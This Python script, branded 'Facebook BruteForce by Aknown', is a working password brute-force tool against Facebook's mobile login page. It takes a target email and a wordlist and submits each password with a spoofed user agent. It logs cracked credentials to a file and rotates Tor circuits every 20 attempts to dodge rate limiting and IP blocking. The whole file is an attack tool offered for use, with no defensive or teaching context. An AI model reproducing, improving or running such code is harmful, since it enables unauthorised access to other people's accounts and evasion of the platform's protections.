import os.path

import requests
import mechanize
import sys,os,time
from mechanize import Browser
logo=""" \033[1;92m   _    _
   / \  | | ___ __   _____      ___ __
  / _ \ | |/ / '_ \ / _ \ \ /\ / / '_ \
     
 / ___ \|   <| | | | (_) \ V  V /| | | |
/_/   \_\_|\_\_| |_|\___/ \_/\_/ |_| |_|
Facebook BruteForce by Aknown:"""
if sys.version_info[0] != 3:
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n''')
  print(65 * '\033[1;92m=')
  sys.exit()
len_pass=0
MIN_PASSWORD_LENGTH = 6


def is_this_a_password(email, index, password):
  br=mechanize.Browser()
  br.set_handle_robots(False)
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=5) 
  br.addheaders=[('User-Agent','Opera/9.80(Android;OperaMini/32.0.2254/85.U;id)Presto/2.12.423Version/12.16')]
  try:
    br.open('https://m.facebook.com/login.php')
  except:
    is_this_a_password(email, index, password)
  try:
    br._factory.is_html=True
    br.select_form(nr=0)
    br.form['email']=email
    br.form['pass']=password
  except:
    is_this_a_password(email, index, password)
  try:
    br.submit()
  except:
    is_this_a_password(email, index, password)
  try:
    url=br.geturl()
    br.close()
    if "save-device" in url:
      ok=open('temp', 'a')
      ok.write(str(email+' | '+password))
      ok.close()
      print(65 * '\033[1;92m=')
      print('\n[+] Password found: \033[1;97m', password)
      print(65 * '\033[1;92m=')
      return True
    elif "checkpoint" in url:
      ok=open('temp', 'a')
      ok.write(str(email+' | '+password))
      ok.close()
      print(65 * '\033[1;92m=')
      print('\n[+] Password found: \033[1;97m', password)
      print(65 * '\033[1;92m=')
      return True
    elif "home.php" in url:
      ok=open('temp', 'a')
      ok.write(str(email+' | '+password))
      ok.close()
      print(65 * '\033[1;92m=')
      print('\n[+] Password found: \033[1;97m', password)
      print(65 * '\033[1;92m=')
      return True
  except:
    pass
  return False

def change_ip():
  try:
    old=requests.get('http://checkip.amazonaws.com/')
  except:
    pass
  while True:
    try:
      x=os.system('killall -HUP tor')
      time.sleep(3)
      ip=requests.get('http://checkip.amazonaws.com/')
    except:
      pass
    try:
      if old.text==ip.text:
        pass
      else:
        return ip.text
    except:
      pass
  
if __name__ == "__main__":
  os.system('reset')
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('\033[1;92mEmail/Username/Id/etc:')
  email = input('\033[1;94m==\033[1;92m>>> \033[1;91m').strip()
  print('\033[1;92m[+] Password File:')
  PASSWORD_FILE = input('\033[1;94m==\033[1;92m>>> \033[1;91m')
  if not os.path.isfile(PASSWORD_FILE):
    print("Password file not exist: ")
    sys.exit(0)
  else:
    try:
      password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    except:
      print('\033[1;91m[!] Error reading file')
      sys.exit(1)
    print('\033[1;92m[+] Passwords Number {}'.format(str(len(password_data))))
    print('\033[1;92m[+] \033[1;91mPlease use Tor')
    print(65 * '\033[1;92m=')
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        elif int(len_pass)==20:
          print(65 * '\033[1;92m=')
          ip=change_ip()
          try:
            print('\033[1;92m[+] New phone: \033[;97m{}'.format(str(ip)))
          except:
            pass
          len_pass=0
        len_pass+=1
        print("\033[1;92mTrying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
